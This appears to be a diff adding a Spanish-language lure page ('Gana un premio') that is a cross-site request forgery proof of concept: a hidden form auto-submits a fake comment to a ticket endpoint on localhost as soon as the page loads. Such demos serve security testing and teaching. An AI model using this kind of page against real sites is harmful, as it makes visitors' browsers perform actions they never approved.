@@ -1,0 +1,5 @@
+<h1>Gana un premio</h1>
+<form id="f" method="post" action="http://127.0.0.1:8000/tickets/1/comments">
+  <input type="hidden" name="body" value="COMENTARIO FALSO (CSRF)">
+</form>
+<script>document.getElementById('f').submit()</script>
